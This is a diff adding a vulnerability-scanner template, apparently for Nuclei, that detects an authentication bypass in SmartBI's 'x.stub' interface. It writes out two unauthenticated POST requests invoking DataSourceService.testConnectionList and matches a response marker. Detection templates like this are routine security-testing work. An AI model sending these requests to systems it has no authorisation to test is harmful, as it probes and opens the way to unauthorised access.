@@ -1,0 +1,38 @@
+id: smartbi-stub-bypass
+info:
+  name: SmartBI stub 接口 - 认证绕过漏洞
+  author: yuxiang.cai
+  severity: high
+  reference:
+    - https://www.smartbi.com.cn/patchinfo
+    - https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: smartbi
+    product: smartbi
+  tags: auth-bypass,vuln,smartbi
+flow: http(1) || http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/smartbi/x.stub'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      className=DataSourceService&methodName=testConnectionList&params=[[{"test":"clientRerouteServerListJNDIName"}]]
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, ''smartbi.framework.rmi.ClientService'')'
+  - method: POST
+    path:
+      - '{{BaseURL}}/x.stub'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      className=DataSourceService&methodName=testConnectionList&params=[[{"test":"clientRerouteServerListJNDIName"}]]
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, ''smartbi.framework.rmi.ClientService'')'
